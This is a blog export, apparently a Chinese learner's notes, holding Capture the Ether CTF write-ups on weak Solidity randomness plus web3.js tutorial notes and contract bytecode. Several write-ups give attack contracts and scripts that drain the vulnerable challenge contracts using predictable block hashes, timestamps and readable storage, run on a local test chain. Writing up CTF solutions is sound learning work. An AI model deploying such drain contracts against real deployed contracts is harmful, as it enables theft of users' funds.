1565b60405161003891906102cc565b60405180910390f35b606060008060005b600160008054905061005b919061031d565b8110156101ab576001925060005b60018260008054905061007c919061031d565b610086919061031d565b81101561019257600060018261009c9190610351565b815481106100ad576100ac610385565b5b9060005260206000200154600082815481106100cc576100cb610385565b5b9060005260206000200154111561017f57600081815481106100f1576100f0610385565b5b90600052602060002001549250600060018261010d9190610351565b8154811061011e5761011d610385565b5b90600052602060002001546000828154811061013d5761013c610385565b5b906000526020600020018190555082600060018361015b9190610351565b8154811061016c5761016b610385565b5b9060005260206000200181905550600093505b808061018a906103b4565b915050610069565b50826101ab5780806101a3906103b4565b915050610049565b5060008054806020026020016040519081016040528092919081815260200182805480156101f857602002820191906000526020600020905b8154815260200190600101908083116101e4575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b61024381610230565b82525050565b6000610255838361023a565b60208301905092915050565b6000602082019050919050565b600061027982610204565b610283818561020f565b935061028e83610220565b8060005b838110156102bf5781516102a68882610249565b97506102b183610261565b925050600181019050610292565b5085935050505092915050565b600060208201905081810360008301526102e6818461026e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061032882610230565b915061033383610230565b925082820390508181111561034b5761034a6102ee565b5b92915050565b600061035c82610230565b915061036783610230565b925082820190508082111561037f5761037e6102ee565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103bf82610230565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103f1576103f06102ee565b5b60018201905091905056fea2646970667358221220ae8c4b8dcba12a3c05b294a45463cdbfcc21cbcdcfe3c2160fd3b8e26fa8304a64736f6c63430008130033&quot;;// 部署合约的代码// contract.deploy(&#123;// data: byteCode,// arguments: [[5,4,3,2,1]]// &#125;).send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// gas: 4700000,// value: 1// &#125;,function(err,result)&#123;// console.log(&quot;合约部署得到的交易哈希为：&quot;);// console.log(result);// &#125;)// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;)// var answer;// web.eth.getStorageAt(address,0,(err,result)=&gt;&#123;// answer = web.utils.hexToNumber(result);// console.log(answer);// &#125;) tips:如果函数需要传参，直接在调用函数的时候传入就可以了，如下：","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"}]},{"title":"Predict the block hash","slug":"CTFS/capther the ether/Predict the block hash","date":"2023-04-10T06:01:10.000Z","updated":"2023-04-10T06:01:10.000Z","comments":true,"path":"2023/04/10/CTFS/capther the ether/Predict the block hash/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/CTFS/capther%20the%20ether/Predict%20the%20block%20hash/","excerpt":"","text":"Predict the block hash1. 题目 1.1 题目： Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123; address guesser; bytes32 guess; uint256 settlementBlockNumber; function PredictTheBlockHashChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(bytes32 hash) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = hash; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); bytes32 answer = block.blockhash(settlementBlockNumber); guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，该题和上一题差不多，这题要猜测的数是 256位的，即byte32类型 2.2 这题是需要预测下一个块哈希的块号，显然是不可能的，但是 官方文档对 block.blockhash 是这样定义和解释的 ![image-20240412145027802](Predict the block hash&#x2F;image-20240412145027802.png) 具体是什么意思呢，我去网上搜的解释是，他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零—-我的理解是：如果题目中的 answer 是在 block.number &#x3D; 0 时设置的，当此时的block.number &gt;&#x3D; 256时，再去计算 block.blockhash(settlementBlockNumber) 这个值就是 block.blockhash(0) 的值了（settlementBlockNumber &#x3D; block.number + 1） 2.3 解题思路就是，当我们调用 lockInGuess() 函数，以 0 的hash 作为参数传入该函数中，过一段时间后，再调用 settle() 函数，具体等多久我也不知道 3. 解题12345678910111213141516171819contract Hack &#123; PredictTheBlockHashChallenge challenge; function Hack(address _challenge) public &#123; challenge = PredictTheBlockHashChallenge(_challenge); &#125; function lockInGuess() public payable &#123; challenge.lockInGuess.value(1 ether)(keccak256(0)); &#125; /* 等过了256个区块之后，再调用此函数*/ function attack() public &#123; challenge.settle(); require(challenge.isComplete(), &quot;not pass&quot;); tx.origin.transfer(address(this).balance); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Predict the future","slug":"CTFS/capther the ether/Predict the future","date":"2023-04-10T04:01:10.000Z","updated":"2023-04-10T04:01:10.000Z","comments":true,"path":"2023/04/10/CTFS/capther the ether/Predict the future/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/CTFS/capther%20the%20ether/Predict%20the%20future/","excerpt":"","text":"Predict the future1. 题目 1.1 This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers. Note that it is indeed possible to solve this challenge without losing any ether. 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123; address guesser; uint8 guess; uint256 settlementBlockNumber; function PredictTheFutureChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 该题需要提前锁定答案，再验证答案（即，先调用 lockInGuess 函数再调用 settle 函数）；很显然这样是猜不出来的，但是由 uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; 可知，answer 的值只用十个可能，即 [0,9] 2.2 我们可以先确定我们自己设定的 answer ，改变题目要求中的 answer ，通过不断改变 block.number 和 时间戳来改变题目中的 answer （调用其他合约时，是在同一块区块中进行的，也就是为我们确定唯一的 block.number 和 时间戳） 2.3 编写一个攻击合约， 123456789101112131415161718192021222324contract attack&#123; PredictTheFutureChallenge pre; uint8 public answer=5; function attack(address _addr)public&#123; pre = PredictTheFutureChallenge(_addr); &#125; function lock()public payable&#123; pre.lockInGuess.value(1 ether)(answer); &#125; function att()public&#123; uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; if(temp == answer)&#123; pre.settle(); &#125; require(pre.isComplete())&#123; tx.orgin.transfer(address(this).balance); &#125; &#125; function()external payable&#123; &#125;&#125; 2.4 先锁定我们的答案（调用lock() 函数），不停的调用att() 函数，直到 PredictTheFutureChallenge 合约中的 isComplete 函数的值返回的是 true 或 合约的余额为 0 3. 解题 3.1 使用 Web3解题（因为remix的bug实在是太多了），先在 remix部署合约，获取相对应的合约地址 tips：部署一个 attack 合约之后，如果执行了lock 函数就不能在不重新部署 PredictTheFutureChallenge合约的基础上使用新合约调用lock函数，因为guesser已经被赋值了，稍后的require 将不能通过 3.2 在我的 vscode上面疯狂执行 att 函数，直到remix上 isComplete返回的值发生改变，合约的金额转移为止，如图：![image-20240412145108409](Predict the future&#x2F;image-20240412145108409.png) 3.3 在 vscode 上的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var contractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\靶场\\\\capturetheether\\\\abi\\\\PredictTheFutureChallengeHack.abi&quot;),toString());// var contractADD = &quot;0x80F5D36E412076Dd758961d729D8F84dc6c34A46&quot;;var contractADD = &quot;0xD52d9e548C6d18445a465dd08b5b2B47ca449Ee9&quot;; // Hack_Addressvar contract = new web.eth.Contract(contractABI,contractADD);// console.log(contract);var balance = web.eth.getBalance(contractADD,function(err,result)&#123;console.log(result);&#125;);// console.log(balance);// 00000000000000000000000580f5d36e412076dd758961d729d8f84dc6c34a46var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; // answer = web.utils.hexToNumber(result); console.log(&quot;这个是结果：&quot; + result);&#125;)// contract.methods.lock().send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// value: 1000000000000000000// &#125;).on(&quot;receipt&quot;,function(result)&#123;// console.log(result);// &#125;)contract.methods.att().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, // value: 1000000000000000000&#125;).on(&quot;receipt&quot;,function(result)&#123; console.log(result);&#125;)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the new number","slug":"CTFS/capther the ether/Guess the new number","date":"2023-04-07T01:47:10.000Z","updated":"2023-04-07T01:47:10.000Z","comments":true,"path":"2023/04/07/CTFS/capther the ether/Guess the new number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/07/CTFS/capther%20the%20ether/Guess%20the%20new%20number/","excerpt":"","text":"Guess the new number1. 题目 1.1 要求： The number is now generated on-demand when a guess is made 1.2 题目代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123; function GuessTheNewNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，answer是在执行 guess 函数的之后才会被赋值，也就是说不能直接通过 web3 和合约交互获取 answer ，但是我们知道同一块区块中的时间戳是同一个，也就是说让 guess 函数和自己的答案在同一个合约中 2.1 什么意思呢，简单来说就是 answer 的定义为： uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now))); (其中 now 就是旧版本的时间戳，现在获取时间戳的方法是：block.timestamp ) 3. 解题攻击合约 12345678910111213141516contract Hack &#123; GuessTheNewNumberChallenge challenge; function Hack(address _challenge) public &#123; challenge = GuessTheNewNumberChallenge(_challenge); &#125; function attack() public payable &#123; uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); challenge.guess.value(1 ether)(answer); &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the random number","slug":"CTFS/capther the ether/Guess the random number","date":"2023-04-05T04:59:10.000Z","updated":"2023-04-05T04:59:10.000Z","comments":true,"path":"2023/04/05/CTFS/capther the ether/Guess the random number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/05/CTFS/capther%20the%20ether/Guess%20the%20random%20number/","excerpt":"","text":"Guess the random number1. 题目 1.1 This time the number is generated based on a couple fairly random sources 1.2 题目代码： 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123; uint8 answer; function GuessTheRandomNumberChallenge() public payable &#123; require(msg.value == 1 ether); answer = uint8(keccak256(block.blockhash(block.number - 1), now)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 题目代码中的 answer 是随机生成的，及根据创建的时候区块号和当时的时间 now 来打的时间戳。 2.2 区块链链上的所有内容都是公开的，我们可以利用与合约交互，获取到合约上存储的值 2.3 又因为合约中只有一个变量，及索引为 0 位置的值，便是我的答案answer 1var contract = new web.eth.Contract(contract_abi,contract_add); tips: 为了弄懂这个存储位置，我还特意去阅读相关文献了解了EVM的存储位置和原理，相关文章在这 ： storage-slot存储拓展 3. 解题 3.1 用 js代码 实现 web3 与合约的交互 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// console.log(web.currentProvider);// remix 上部署的合约地址var contract_add = &quot;0x4DB61fCf9a56da7575e38f68BAf8E1621513001a&quot;;// 在remix 上获取的 ABIvar contract_abi = [ &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;n&quot;, &quot;type&quot;: &quot;uint8&quot; &#125; ], &quot;name&quot;: &quot;guess&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;isComplete&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bool&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 创建合约实例var contract = new web.eth.Contract(contract_abi,contract_add);// console.log(contract);web.eth.getStorageAt(contract_add,0,(error,result) =&gt; &#123; // 将结果的 16 进制数转化为 10进制 var answer = web.utils.hexToNumber(result); //输出结果 console.log(&quot;存储为：&quot;,answer)&#125;) 3.2 在控制台获取 合约 的 answer ![image-20240412144836149](Guess the random number&#x2F;image-20240412144836149.png) 3.3 在 remix 中验证 ![image-20240412144855415](Guess the random number&#x2F;image-20240412144855415.png) 3.4 结果正确","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3_self","slug":"Utils/Web3/web3_self","date":"2023-04-01T02:47:10.000Z","updated":"2023-04-01T02:47:10.000Z","comments":true,"path":"2023/04/01/Utils/Web3/web3_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/01/Utils/Web3/web3_self/","excerpt":"","text":"web3_day01学习资源视频官方文档好文档1. Web3.js 的安装1.1 node.js 的下载安装及配置： 参考博客1.2 在 VSCode 中安装插件 ： code runner 2. 下载安装使用Ganache网上搜一下就有了，建议自己创建一个工作的空间，这样之前操作 的交易信息就会被保留下来。 3. 跟着视频敲代码3.1 视频中的代码：123let Web3 = require(&#x27;web3&#x27;);web3 = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web3); 分析： 解读：第一行中的 require(&#39;web3&#39;) web3是库中的名字，我以为是自定义的，尝试改成其他名字报错如下： 变量名 web3 容易和第一行中的 ‘web3’ 搞混，所以自己换了一个变量名 自己的代码： 123let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web); 4. 子模块列表 在执行这段代码的时候，出现了错误 代码： 1234let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));web.eth.getNodeInfo().then(console.log); 解读： 官方文档上的原函数是这样这样写的: web3.eth.getNodeInfo([callback]); 老师的写法是： web.eth.getNodeInfo().then(); 老师说是一样的，.then 的意思是：执行完web.eth.getNodeInfo() 之后，再去执行 .then() 括号里的代码，即 console.log 。 错误： 解决方案： 打开菜单选项，找到之前安装的 Ganache，启动它即可，然后再次运行代码 总结：如果把 Ganache 关闭了，代码又是不能运行的，只有将 Gannache 一直开着的，才可以正常运行，但是 不知那一大串是什么 5. 网络状态查询5.1 查看是否连接到节点 ： web.eth.net.isListening().then(console.log); web.bzz.net.isListening().then(console.log); 5.2 获取 Network ID (网络号) 6. providers相关6.1 查看 Web3 中所有可用的Providers 代码： 123456789&gt;let Web3 = require(&#x27;web3&#x27;);&gt;web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));&gt;// web.eth.getNodeInfo().then(console.log);&gt;// web.eth.net.isListening().then(console.log);&gt;// web.bzz.net.isListening().then(console.log);&gt;console.log(web.providers); 运行结果： 6.2 查看当前设置的 Web3 provider 6.3 查看浏览器环境设置的web3 provider 6.4 设置&#x2F; 修改 provider 7. 批处理请求7.1 将发布合约到测试网 重头戏！！！看到这个界面，我就知道，我又可以学到东西了 原来是是这样连接本地的账户，直接惊呆！ 方法一： ① 打开remix，选择这两个其中之一： ② 将自己本地的端口号填入： ③ 然后就呈现如下界面： ④ 本地账户和remix 中的 账户一一对应： 方法二：嵌入式连接 ① 添加网络 ② 和 remix 建立连接 此时当前网络钱包没钱 ③ 通过私钥导入本地账户 ④ 导入成功之后，就可以在remix 中同步账户余额 ⑤ 可以测试一下，是否能正常使用，结果是 ok 滴 ⑥ 在本地可以查看 remix部署的合约 7.2 复制ABI 和 地址到程序中 ① 复制 remix 中的 ABI ② 到代码程序中，定义一个变量 var abi,并将复制的ABI 作为值，赋给 abi ③ 到remix 中拷贝地址，并赋予 我们自定义的变量 var address 1var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;; ④ 通过 ABI 和 合约地址 去 创建合约对象 1var contract = new web.eth.Contract(abi,address); ⑤ 然后就是是一系列的调用操作（目前代码还不是很懂） 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getNodeInfo().then(console.log);// web.eth.net.isListening().then(console.log);// web.bzz.net.isListening().then(console.log);// console.log(web.providers);// console.log(web);// console.log(Web3.modules);// console.log(Web3.version);// var web = new Web3(Web3.givenProvider || &quot;ws://localhost:8545&quot;);// console.log(web);var abi = [ &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;_number&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;name&quot;: &quot;setNumber&quot;, &quot;outputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;name&quot;: &quot;getNumber&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 部署出来的合约地址var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;;var contract = new web.eth.Contract(abi,address);function callBack1() &#123; console.log(&quot;callBack1() is running&quot;);&#125;function callBack2() &#123; console.log(&quot;callBack2() is running&quot;);&#125;var batch = new web.BatchRequest();// &quot;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&quot; 是函数调用者的地址batch.add(web.eth.getBalance.request(&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;,&#x27;latest&#x27;,callBack1));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,callBack2));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,function(error,reusult)&#123; console.log(error); console.log(reusult);&#125;));batch.execute(); 结果： 8. 大数据处理（bigNumber）》》》工具的文档在此处8.1 简介 测试案例： 9. 以太单位转换9.1 web3.utils.fromWei 注意：web3.utils.fromWei(number,[unit])中的 number 通常都是用字符串表示，如果直接是数字的话就会报错 示例： 9.2 web3.utils.toWei 9.3 web3.utils.toHex 演示： tips: 还可以将字符串转换为 16进制 9.4 web3.utils.hexToNumberString 演示示例： 9.5 还有一些其他的转化 10. 地址相关的操作10.1 web3.isAddress ***解读：为什么第五条代码执行的结果为 false？ *** 可以参考我同学的博客：[26.checksum of address | solidity life (levi104.com)](https://www.levi104.com/2023/04/02/03.solidity进阶/26.checksum of address&#x2F;) 11. 查询区块信息11.1 查询最新的区块号(区块高度)–web3.eth.getBlockNumber() 11.2 查询最新区块– we3.eth.getBlock() 11.3 查询区块中的交易 – web3.eth.getTransactionFromBlock() web3_day0212. web3.js 交易操作12.1 账户相关12.1.1 查询账户个数 – web3.eth.getAccount() 12.1.2 查询账户个数 – web3.eth.getAccounts() 12.1.3 查询coinbase – web3.eth.getCoinbase() 12.2 交易相关12.2.1 查询余额 – web3.eth.getBalance() 12.2.2 查询平均 gas 价格 123web3.eth.getGasPrice().then((result) =&gt; &#123; console.log(&quot;wei: &quot; + result);&#125;) 可能是我没学过前端吧，这个写法属实让我震惊。。。。。 12.3 交易执行相关12.3.1 发送交易 – web3.eth.sendTransaction() 突发奇想，试试能不能给我另一个账户转钱 代码： 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), data: &#x27;&#x27;&#125;web.eth.sendTransacation(transactionObject).then(console.log); from (本地账户)： to (钱包地址)： 但是报错了，如下： 再回去看视频，打开弹幕，直接狠狠感谢弹幕老哥！！！！ 正确代码：将 data 字段删掉，或者注释掉 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), // data: &#x27;&#x27;&#125;web.eth.sendTransaction(transactionObject).then(console.log); 代码正常运行： 到我的钱包去查看余额，发现转账成功： 12.3.2 查询交易信息 — web3.eth.getTransaction() 12.3.3 查询交易收据（进区块数据） – web3.eth.getTransactionReceipt() 13. web3.js 合约交互 — 最想学的地方13.1 应用程序二进制接口(ABI)13.1.1 ABI 简介 13.1.2 ABI 范例 13.1.3 ABI表现形式举例 13.1.4 ABI 的作用 13.2 创建合约13.2.1 准备智能合约 MyContract.sol: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123; //状态变量 string storageVaule; //public 的状态变量 string public name; // 构造函数 constructor() public &#123; storageVaule = &quot;biyou&quot;; &#125; // 结构体 struct Student &#123; string name; int age; &#125; // 修改状态变量 function setStorageValue(string memory str) public &#123; storageVaule = str; &#125; function getStorageValue() public view returns(string memory) &#123; return storageVaule; &#125; // 可以发币的函数 function setMoney() public payable &#123; &#125; // 事件 event myEvent (string name); function emitEvent(string memory name) public returns(string memory) &#123; emit myEvent(name); return strConcat(&quot;hello&quot;,name); &#125; function strConcat(string memory _a, string memory _b) internal pure returns(string memory) &#123; bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); string memory ret = new string(_ba.length + _bb.length); bytes memory bret = bytes(ret); uint k = 0; for (uint i = 0; i &lt; _ba.length; i++) bret[k++] = _ba[i]; for (uint i = 0; i &lt; _bb.length; i++) bret[k++] = _bb[i]; return string(ret); &#125;&#125; 13.2.2 直接使用js在区块链上部署一个新的智能合约（！！！难点） 测试代码： 1234567891011121314151617181920212223let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var data = &quot;0x608060405234801561001057600080fd5b506040518060400160405280600581526020017f6269796f750000000000000000000000000000000000000000000000000000008152506000908051906020019061005c929190610062565b50610166565b82805461006e90610105565b90600052602060002090601f01602090048101928261009057600085556100d7565b82601f106100a957805160ff19168380011785556100d7565b828001600101855582156100d7579182015b828111156100d65782518255916020019190600101906100bb565b5b5090506100e491906100e8565b5090565b5b808211156101015760008160009055506001016100e9565b5090565b6000600282049050600182168061011d57607f821691505b6020821081141561013157610130610137565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61095f806101756000396000f3fe60806040526004361061004a5760003560e01c806306fdde031461004f57806344e649b71461007a57806390ad7f5414610084578063982296a8146100af578063ec6070f6146100ec575b600080fd5b34801561005b57600080fd5b50610064610115565b60405161007191906106a9565b60405180910390f35b6100826101a3565b005b34801561009057600080fd5b506100996101a5565b6040516100a691906106a9565b60405180910390f35b3480156100bb57600080fd5b506100d660048036038101906100d1919061062f565b610237565b6040516100e391906106a9565b60405180910390f35b3480156100f857600080fd5b50610113600480360381019061010e919061062f565b6102b6565b005b60018054610122906107df565b80601f016020809104026020016040519081016040528092919081815260200182805461014e906107df565b801561019b5780601f106101705761010080835404028352916020019161019b565b820191906000526020600020905b81548152906001019060200180831161017e57829003601f168201915b505050505081565b565b6060600080546101b4906107df565b80601f01602080910402602001604051908101604052809291908181526020018280546101e0906107df565b801561022d5780601f106102025761010080835404028352916020019161022d565b820191906000526020600020905b81548152906001019060200180831161021057829003601f168201915b5050505050905090565b60607f52b54003f649c6d5ca97ae2b169c38f3c257eb14026ad745b11808153cdfd1528260405161026891906106a9565b60405180910390a16102af6040518060400160405280600581526020017f68656c6c6f000000000000000000000000000000000000000000000000000000815250836102d0565b9050919050565b80600090805190602001906102cc929190610524565b5050565b6060600083905060008390506000815183516102ec919061073d565b67ffffffffffffffff81111561032b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561035d5781602001600182028036833780820191505090505b50905060008190506000805b855181101561043d578581815181106103ab577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b8383806103c290610842565b9450815181106103fb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061043590610842565b915050610369565b5060005b845181101561051557848181518110610483577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b83838061049a90610842565b9450815181106104d3577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061050d90610842565b915050610441565b50829550505050505092915050565b828054610530906107df565b90600052602060002090601f0160209004810192826105525760008555610599565b82601f1061056b57805160ff1916838001178555610599565b82800160010185558215610599579182015b8281111561059857825182559160200191906001019061057d565b5b5090506105a691906105aa565b5090565b5b808211156105c35760008160009055506001016105ab565b5090565b6